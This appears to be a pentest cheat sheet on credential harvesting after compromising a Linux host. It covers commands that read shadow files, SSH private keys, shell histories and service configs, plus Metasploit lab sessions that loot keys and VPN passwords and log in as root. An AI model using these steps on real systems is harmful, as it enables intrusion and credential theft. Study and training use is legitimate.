# Credentials

## 01 - Unix Shell

### 1.1 - Passwords

#### 1.1.1 - History

- **Password and Keys - History Files**

`$ ls -lat /home/*/.*hist`

`$ cat ~/.bash_history`

`$ cat ~/.nano_history`

`$ cat ~/.atftp_history`

`$ cat ~/.mysql_history`

`$ cat ~/.php_history`

`$ cat ~/.*history | less`

- **Remote Logins - History Files**

`$ grep ^ssh /home/*/.*history`

`$ grep ^telnet /home/*/.*history`

`$ grep ^mysql /home/*/.*history`

#### 1.1.2 - Files

- **Display the sensitive information of the GNU/Linux systems**

`$ cat /etc/pwd.db`

`$ cat /etc/master.passwd`

`$ cat /etc/shadow | grep '\$6\$'`

`$ cat /etc/gshadow`

`$ cat /etc/gshadow-`

`$ cat /etc/spwd.db`

`$ cat /etc/security/opasswd`

`$ ls -alh /var/mail/`

- **List directories to check if you have permission to look at the files and other directories**

`$ ls -lahR /root/`

`$ ls -lahR /home/`

#### 1.1.3 - Others

- **Find something that is related to credentials**

`$ grep -i user file.txt`

`$ grep -i pass file.txt`

`$ grep -C 5 "password" file.txt`

`$ find . -name "*.php" -print0 2>/dev/null | xargs -0 grep -i -n "var $password"`

`$ grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab`

`$ find / -type f -exec grep -i -I "PASSWORD" {} /dev/null \;`

`$ find / -type f -exec grep -i -I "PASSWORD\|PASS=" {} /dev/null \;`

Look for the enumeration phase related to running process that is related to user rights context of [[Processes and Services]] There are services that have a possibility that stores the credentials in plain text. Run the command `ps aux`, retrieve the Process ID (PID), run it against with a debugger.

`$ gdb -p <service_name>`

`$ gdb <pid>`

### 1.2 - SSH Keys

- **Password and Keys - SSH Keys**

`$ cat /home/*/.ssh/authorized_keys`

`$ cat /home/*/.ssh/config`

`$ cat /home/*/.ssh/identity.pub`

`$ cat /home/*/.ssh/identity`

`$ cat /home/*/.ssh/id_rsa.pub`

`$ cat /home/*/.ssh/id_rsa`

`$ cat /home/*/.ssh/id_dsa.pub`

`$ cat /home/*/.ssh/id_dsa`

`$ cat /etc/ssh/ssh_config`

`$ cat /etc/ssh/sshd_config`

`$ cat /etc/ssh/ssh_host*`

`$ cat /etc/ssh/ssh_host_dsa_key.pub`

`$ cat /etc/ssh/ssh_host_dsa_key`

`$ cat /etc/ssh/ssh_host_rsa_key.pub`

`$ cat /etc/ssh/ssh_host_rsa_key`

`$ cat /etc/ssh/ssh_host_key.pub`

`$ cat /etc/ssh/ssh_host_key`

Once you were able to get the SSH Keys using the chmod command with octal permissions then authenticate through the compromised server

`$ chmod 600 ssh_key`

`$ ssh -i ssh_key <user>@<IP>`

### 1.3 - Config Files

#### 1.3.1 - VPN

- **Password and Keys - Config Files**

`$ cat myvpn.ovpn`

#### 1.3.2 - Content Management System (CMS)

Looking for web configuration files that could help us to perform privilege escalation to reuse the credentials with [[Sudo#^4e12e8|Sudo Rights]]

##### 1.3.2.1 - Wordpress

`$ cat /var/www/html/wordpress/wp-config.php`

#### 1.3.3 - Webapps

Configuration files related to webapp development that does contain a database to authenticate with credentials and others as well

`$ find . -name "*.php" 2>/dev/null`

`$ find / -type d -name config 2>/dev/null`

`$ ls -lahR /var/www/`

`$ ls -lahR /srv/www/htdocs/`

`$ ls -lahR /usr/local/www/apache22/data/`

`$ ls -lahR /opt/lampp/htdocs/`

`$ ls -lahR /var/www/html/`

#### 1.3.4 - FTP

`$ cat /etc/vsftpd.conf`

`$ cat /etc/ftpusers`

`$ cat /etc/ftpd.conf`

`$ cat /etc/proftpd.conf`

#### 1.3.5 - HTTP

##### 1.3.5.1 - Apache

`$ cat /var/apache2/config.inc`

#### 1.3.6 - Telnet

`$ cat /etc/inetd.conf`

`$ cat /etc/xinetd.d/telnet`

`$ cat /etc/xinetd.d/stelnet`

## 02 - Metasploit

### 2.1 - SSH Keys

```
meterpreter > search -f authorized_keys -d /
No files matching your search were found.
meterpreter > search -f id_rsa -d /
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
/backups/supersecretkeys/id_rsa  2590          2020-06-17 23:20:44 -0400

meterpreter > download /backups/supersecretkeys/id_rsa /home/user/.ssh/id_rsa
[*] Downloading: /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
[*] Downloaded 2.53 KiB of 2.53 KiB (100.0%): /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
[*] download   : /backups/supersecretkeys/id_rsa -> /home/user/.ssh/id_rsa
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(multi/gather/ssh_creds) > use auxiliary/scanner/ssh/ssh_login_pubkey
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > options

Module options (auxiliary/scanner/ssh/ssh_login_pubkey):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   KEY_PASS                           no        Passphrase for SSH private key(s)
   KEY_PATH                           no        Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in ".pub
                                                " will be skipped. Duplicate private keys will be ignored.
   PRIVATE_KEY                        no        The string value of the private key that will be used. If you are using MSFConsole, this value shou
                                                ld be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.
   RHOSTS                             yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads (max one per host)
   USERNAME                           no        A specific username to authenticate as
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set private_key file:/home/user/.ssh/id_rsa
private_key => -----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/kYC4
B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLmaH7UqBj9X1WjGeZLexx+f2
kPAcxLkXaPNq0q5kjXyygRi34LvOn/wdpux7T3pGYsG1HmFrb6LVkBIB9B10LtJGv1q6vl
..[snip]..
pOLQNytsDeZNlKoCUZHvj7cHKFzkdDAAAAwQDXGF2W/3zgltz4G362qpBL4lEo3UHpxp52
+IaZ4FX2yKA42rggJW7XSwZvtPIErIRDFxgNW/3Rv/pyzEqFK5+jG606XpeufxfvdD/PWw
nwXur7vpiut49V2ig0UjaQxyjQjNjb29XH2/yhDjLOetTf5ZRhyafnImUzvZ28NArJfdBy
i2bE6UXt34y9lY+X0nG7V2rfQFBf4kbV/4Kz0uMyUXN2SvEzcxO+4WGILSQFj+x9MsY0YE
STOMIZSSBDSfkAAAAJcm9vdEBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----

msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set rhosts 10.10.140.168
rhosts => 10.10.140.168
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > set username root
username => root
msf6 auxiliary(scanner/ssh/ssh_login_pubkey) > exploit

[*] 10.10.140.168:22 SSH - Testing Cleartext Keys
[*] 10.10.140.168:22 - Testing 1 key from PRIVATE_KEY
[+] 10.10.140.168:22 - Success: 'root:-----BEGIN RSA PRIVATE KEY-----
MIIG5AIBAAKCAYEAzSWvqfxeIpTuFmdAFyWDQho0h8ud3g9zSJ32pjosNcTQJe3/
kYC4B5hMlfIXzH5oKn9YRn55O10RYxppZpXFsc4H7pYquD5TLKLmaH7UqBj9X1Wj
..[snip]..
reT9n/DDIuzTxKEX7xhn5f8kT3G5P+GSPFmiSFmh9Dh1/SAIYLPfDIdpSobyrfO8
fMbv0kcEKV8y/X8Ut/n74z0EtRWEERCZuA8+JPLN7P82UP7Cbohjxg==
-----END RSA PRIVATE KEY-----
' 'uid=0(root) gid=0(root) groups=0(root) Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux '
[*] SSH session 2 opened (10.8.145.108:37683 -> 10.10.140.168:22) at 2022-05-23 17:44:13 -0400
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

### 2.2 - Config Files

```
meterpreter > pwd
/home/user
meterpreter > search -f *.ovpn -d /
Found 1 result...
=================

Path                   Size (bytes)  Modified (UTC)
----                   ------------  --------------
/home/user/myvpn.ovpn  212           2017-05-15 20:14:59 -0400

meterpreter > cat myvpn.ovpn
client
dev tun
proto udp
remote 10.10.10.10 1194
resolv-retry infinite
nobind
persist-key
persist-tun
ca ca.crt
tls-client
remote-cert-tls server
auth-user-pass /etc/openvpn/auth.txt
comp-lzo
verb 1
reneg-sec 0

meterpreter > cat /etc/openvpn/auth.txt
user
password321
meterpreter > run post/multi/gather/irssi_creds

[!] SESSION may not be compatible with this module:
[!]  * incompatible session type: meterpreter
[*] Finding ~/.irssi/config
[*] Looting 1 files
[+] Found IRC password(s) of password321 in irssi config at /home/user/.irssi/config
[+] irssi config with passwords stored in /root/.msf4/loot/20220523133749_default_10.10.198.41_irssiconfigfil_990648.txt

$ sudo cat /root/.msf4/loot/20220523133749_default_10.10.198.41_irssiconfigfil_990648.txt | grep -i passw
    autosendcmd = "/msg nickserv identify password321 ;wait 2000";
```

### 2.3 - History

```
meterpreter > run post/linux/gather/enum_users_history

[+] Info:
[+]     Debian GNU/Linux 6.0
[+]     Linux debian 2.6.32-5-amd64 #1 SMP Tue May 13 16:34:35 UTC 2014 x86_64 GNU/Linux
[-] Failed to open file: /home/user/.ash_history: core_channel_open: Operation failed: 1
[+] bash history for TCM stored in /root/.msf4/loot/20220523132458_default_10.10.198.41_linux.enum.users_602188.txt
[-] Failed to open file: /home/user/.csh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.ksh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.sh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.tcsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.zsh_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.mysql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.psql_history: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.dbshell: core_channel_open: Operation failed: 1
[-] Failed to open file: /home/user/.viminfo: core_channel_open: Operation failed: 1
[-] Failed to open file: /etc/sudoers: core_channel_open: Operation failed: 1
[+] Last logs stored in /root/.msf4/loot/20220523132500_default_10.10.198.41_linux.enum.users_618604.txt

$ sudo cat /root/.msf4/loot/20220523132458_default_10.10.198.41_linux.enum.users_602188.txt | grep -i passw
mysql -h somehost.local -uroot -ppassword123
cat /etc/passwd | cut -d: -f1
awk -F: '($3 == "0") {print}' /etc/passwd
```

## References

- [Privilege Escalation Drives](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#drives)

- [Privilege Escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#passwd-shadow-files)

- [Linux Var Log Files](http://www.thegeekstuff.com/2011/08/linux-var-log-files/)

- [Linux Privilege Escalation Checklist](https://steflan-security.com/linux-privilege-escalation-checklist/)